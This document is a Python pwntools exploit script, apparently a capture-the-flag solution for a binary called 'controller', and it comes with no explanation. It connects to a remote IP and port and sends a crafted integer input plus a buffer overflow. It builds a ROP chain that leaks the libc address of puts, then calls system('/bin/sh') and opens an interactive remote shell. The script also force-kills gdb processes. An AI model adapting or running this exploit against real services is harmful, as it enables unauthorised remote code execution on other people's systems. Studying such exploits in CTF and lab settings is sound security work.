from pwn import *

def b2h(in_bytes: bytes):
    out_str = ''
    for j in range(math.ceil(len(in_bytes) / 4)):
        out_str += ''.join([str(hex(in_bytes[j*4+3-k]))[2:].rjust(2, '0') for k in range(4)]) + ':'
    return out_str[:-1]


os.system('pkill -9 gdb')
context.terminal = ['tmux', 'splitw', '-h', '-I']
context.arch = 'amd64'

elf = ELF('./controller')
local = False

if local:
    proc = elf.process()
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    proc = remote('178.62.50.172', 32338)
    context.noptrace = True
    libc = ELF('./libc.so.6')

gdb.attach(proc, '\n'.join([
    'b *0x004010fd',
    'c'
]) + '\n')

rop_libc = ROP([elf])
rop_libc.call(elf.plt['puts'], [elf.got['puts']])
rop_libc.call(elf.symbols['calculator'])

proc.sendline('0 -65338')
proc.sendline('2')
# proc.sendline('a'*32 + 'b'*8 + '\x00\x00\x00\x00\x00\x40\x07\xaf'[::-1])
proc.sendline(b'a'*32 + b'b'*8 + rop_libc.chain())
print(proc.recvuntil('ingored\n', drop=True))
puts = u64(proc.recvline(False).ljust(8, b'\x00'))
libc.address = puts - libc.symbols['puts']
info(f'Libc found at {hex(libc.address)}')

rop = ROP([libc])
rop.call(libc.symbols['puts'], [next(libc.search(b'/bin/sh'))])
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

proc.sendline('0 -65338')
proc.sendline('2')
proc.sendline(b'a'*32 + b'b'*8 + rop.chain())
proc.interactive()
